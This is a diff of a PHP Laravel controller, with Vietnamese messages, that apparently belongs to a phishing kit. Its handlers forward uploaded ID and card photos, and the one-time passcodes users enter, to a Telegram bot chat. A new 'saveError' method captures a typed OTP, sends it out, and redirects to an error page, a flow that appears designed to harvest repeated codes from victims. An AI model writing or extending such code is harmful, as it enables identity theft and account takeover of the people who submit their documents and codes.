@@ -82,19 +82,15 @@ class OtpController extends Controller
         $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message . "&parse_mode=HTML";
 
         Artisan::call('app:send', ['url' => $url]);
+
         $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" .
             asset('storage/' . $mattruoc_name) . "&caption=Ảnh mặt trước";
 
-        Artisan::call(
-            'app:send',
-            ['url' => $url]
-        );
-
+        Artisan::call('app:send', ['url' => $url]);
 
         $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_name) . "&caption=Ảnh mặt sau";
 
         Artisan::call('app:send', ['url' => $url]);
-
 
         $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $mattruoc_card_name) . "&caption=Ảnh mặt trước thẻ";
 
@@ -105,10 +101,7 @@ class OtpController extends Controller
 
         Artisan::call('app:send', ['url' => $url]);
 
-        return response()->json([
-            'message' => 'Thêm khách hàng thành công',
-            'status' => 'success'
-        ]);
+        return redirect()->route('otp');
     }
 
     public function otp(Request $request)
@@ -127,11 +120,26 @@ class OtpController extends Controller
 
         file_get_contents($url);
 
-        return response()->json([
-            'message' => 'Mã OTP đã được gửi',
-            'otp' => $otp,
-            'status' => 'success'
+        return redirect()->route('otp');
+    }
+
+    public function saveError(Request $request)
+    {
+        $request->validate([
+            'otp' => 'required',
+        ], [
+            'otp.required' => 'Vui lòng nhập số điện thoại',
         ]);
+
+        $otp =  $request->otp;
+
+        // send otp to phone
+        $message = "Mã OTP là: " . $otp;
+        $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendMessage?chat_id=" . env('TELEGRAM_CHAT_ID') . "&text=" . $message;
+
+        file_get_contents($url);
+
+        return redirect()->route('otp_error');
     }
 
     public function upload(Request $request)
